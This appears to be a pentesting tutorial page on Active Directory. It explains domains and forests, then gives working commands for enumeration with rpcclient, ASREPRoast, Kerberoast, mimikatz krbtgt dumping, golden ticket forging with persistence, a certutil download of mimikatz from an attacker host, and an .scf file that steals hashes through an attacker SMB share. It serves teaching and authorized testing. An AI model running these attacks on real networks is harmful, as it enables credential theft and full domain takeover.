---
description: Explanation of the Active Directory pentesting methodology
---

# Active Directory Principles and attacks

## Active Directory Principles

Active Directory is a directory service developed by Microsoft for managing user accounts, computers, and other resources within a network environment. It provides a centralized database that stores information about network resources and enables administrators to manage access and permissions to these resources.

Active Directory is commonly used in enterprise environments, where it can be used to manage large numbers of users and computers. It provides a hierarchical structure, allowing administrators to organize resources into logical groups, such as departments or locations, and apply policies and permissions to these groups.

Active Directory also supports authentication and authorization, allowing users to log in to the network and access resources based on their permissions. It can also be used to manage security policies, such as password policies and account lockout policies, and to deploy software and updates to network computers.

The main principles are:

* A **domain** represents logical group of interconnected computers that are connected to a network sharing a centralized database.
* A **domain controler DC** is the system in charge of managing the database of the Active Directory.&#x20;
* A **forest** is the full set of subdomains (also called trees) including the root domain.
* A **tree** is a subdomain with a complete infraestructure. For example, in enterprise environments a tree is normally used to separate departments.

### Active Directory enumeration

With the credentials of any user, even if they do not have any privileges, it is possible to enumerate all the users on the domain. There is a concept that must be considered:

* Every user and group has a RID value that identifies it within the domain.

To enumerate the domain, with the tool `rpcclient` and some user credentials, the commands that could be used could be:

1. Enumerate all the users on the domain.

```sh
rpcclient -U 'domain_name.local\username%password' IP_address -c 'enumdomusers'
```

This command will show the different users with their RID values.

2. Get the information of a specific user.

```sh
rpcclient -U 'domain_name.local\username%password' IP_address -c 'queryuser 0xRID'
```

3. Enumerate all the groups on the domain.

```sh
rpcclient -U 'domain_name.local\username%password' IP_address -c 'enumdomgroups'
```

4. To enumerate the users belonging to the admin group, with the result of the previous command, we could get the RID value of the admin group and then:

```sh
rpcclient -U 'domain_name.local\username%password' IP_address -c 'querygroupmem 0xRID'
```

{% hint style="info" %}
There is another way of enumerate a domain with the tool `lsadomaindump`. This tool can be obtained from GitHub and by setting up an Apache server, this tool creates a very friendly overview of the domain using tables.
{% endhint %}

### Access to the Active Directory

If in the reconnaissance stage we find that the port of WinRM is opened (port 5985), we could use the tool evil-winrm to connect using any user credentials obtained.&#x20;

```sh
evil-winrm -u 'username' -p 'password' -i ip_address
```

### Active Directory attacks

#### ASREPRoast attack

A user is vulnerable to this type of attack if it has the property of "No previous authentication request" enabled. For this attack it is not needed any password, only the name of at least a user (normally a list of the domain users to try it with all of them). The most common way of performing this attack is the following:

```sh
impacket-GetNPUsers domain_name.local/ -no-pass -usersfile users.txt
```

{% hint style="info" %}
`'users.txt'` is a list of users.
{% endhint %}

When launching this attack, if the user is not vulnerable to it the output is "UF\_DONT\_REQUIRE\_PREAUTH". If the attack success, the hash of the user is shown.

#### Kerberoast attack

For this type of attack we need valid credentials of a user. A user is vulnerable to this attack if it has a SPN (Service Principal Name) configured. With valid credentials we could use impacket as for ASREPRoast attacks.

1. Checking if there is any vulnerable user to Kerberoast.

```bash
impacket-GetUserSPNs domain_name.local/username:password
```

2. If the output of the command shows any vulnerable user, using the same command as before we could get the hash of the vulnerable user to crack it offline.

```
impacket-GetUserSPNs domain_name.local/username:password -request
```

#### Golden Ticket Attack

This attack consists of getting a ticket which provides full access to the domain. For that we need the hash of the krbtgt domain account which is in charge of managing the tickets.

For this type of attack we need some user credentials, even if the user has low privileges. With those user credentials we can get an interactive shell using impacket as follows:

```sh
impacket-psexec domain_name.local/username:password@IP_address cmd.exe
```

Once we get this interactive shell, the steps to perform a golden ticket attack would be the following:

1. Getting the krbtgt account information:
   * To do this, we need to share some resources from the attacker's machine to the target machine such as the mimikatz.exe to launch the tool. To do so, in the attacker's machine we could set up a python server with `python -m SimpleHTTPServer` and in the target machine get the resource using the `certutil.exe` utility.&#x20;

{% hint style="info" %}
`certutil.exe` is a native binary that is supposed to be used to manage certificates but it can be used to download files. In this case, we must specify the arguments `-urlcache` and `-f` to force the binary to fetch the URL and update the cache. As it is a native binary, it isn't normally blocked.
{% endhint %}

```bash
certutil.exe -f -urlcache -split http://attacker_IP_address:port/mimikatz.exe mimikatz.exe
```

2. In the target machine, having uploaded mimikatz, we run the tool and then we can dump the information of the `krbtgt` account with:

```
lsadump::lsa /inject /name:krbtgt
```

3. To then create the golden ticket there are several ways but here only two are explained:

#### Creating a `.kirbi` file

1. With the information of the krbtgt user, we can create a golden ticket as follows:

```
kerberos::golden /domain:[domain_name.local] /sid:[sid_domain] /rc4:[NTLM_krbtgt] /user:[username] /ticket:[filename_gt.kirbi]
```

1. With the `file.kirbi` created, we transfer this file to the attacker's machine using the utility `impacket-smbserver` for example.&#x20;
2. Once with the golden ticket, within any user account with no privileges, with a simple python server we could transfer mimikatz and the golden ticket and execute the following in mimikatz to access privileged information:

```
kerberos::ptt golden.kirbi
```

#### Using the impacket tool ticketer

1. With the following command it will be created and saved a golden ticket for the user USERNAME specified in the command using `.ccache` extension.

```
impacket-ticketer -nthash [NTLM_hash] -domain-sid [domain_sid] -domain [domain_name] USERNAME
```

2. To achieve full persistence we need to export the environment variable to the path of our golden ticket, which is the path of the credential cache:

```bash
export KRB5CCNAME="path/to/the/file/USERNAME.ccache"
```

Now, we can connect using `impacket-psexec` to any user account without specifying the password, using the arguments `-n` and `-k`.

```
impacket-psexec -n -k domain_name.local/username@IP_address cmd.exe
```

Moreover, even if the password of the user is changed, the golden ticket will still work and the attacker will still be able to log as any user.&#x20;

{% hint style="info" %}
There is another tool called `Rubeus` that can be used to perform most attacks in AD such as ASREPRoast and Kerberoast.
{% endhint %}

{% hint style="info" %}
There are also graphical tools like Neo4j and BloodHunt that provides a lot of information and graphs representing the AD environment, attack vectors, vulnerable accounts, etc.&#x20;
{% endhint %}

#### Another attacks --> file.scf

This type of files are called Shell Command Files and they are very characteristic as they could work as a vector attack for the attackers. If there is a shared resource that can be accessed, authenticated as a user or even unauthenticated, the attacker could create a file with `.scf` extension.

{% hint style="info" %}
These files are very characteristic as they have a parameter called IconFile that can be loaded from another place. If in the IconFile field we specify that the resource will be loaded from a resource in the attacker's machine, whenever the administrator browses through the shared folder the hash would be sent to the attacker. In this case the attacker must have created a shared resource with `impacket-smbserver` to listen for resource requests.
{% endhint %}

The format of the file is the following:

```
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```
